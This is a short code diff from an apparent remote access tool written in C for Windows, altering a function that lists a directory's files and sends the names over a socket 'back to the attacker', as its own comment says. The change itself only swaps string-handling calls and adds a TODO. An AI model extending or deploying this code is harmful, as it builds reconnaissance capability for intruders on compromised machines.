@@ -95,7 +95,7 @@ void listDirectoryContents(SOCKET sock) {
 	// create the string used to send the file names back to the attacker
 	returnLen += 20; // buffer for extra chars added
 	returnInfo = (char *)malloc(returnLen);
-	memcpy_s(returnInfo, returnLen, "SUCCESS:", 9);
+	sprintf_s(returnInfo, returnLen, "SUCCESS:");
 
 	// get the first result again and check if it's valid (should be)
 	findHandle = FindFirstFileA(searchPath, &fileData);
@@ -108,6 +108,7 @@ void listDirectoryContents(SOCKET sock) {
 
 	// concatenate all the file names to the 'returnInfo' string
 	do {
+		// TODO - change this to use sprintf_s() instead of strcat_s()
 		strcat_s(returnInfo, returnLen, fileData.cFileName);
 		strcat_s(returnInfo, returnLen, "\n");
 	} while (FindNextFileA(findHandle, &fileData));
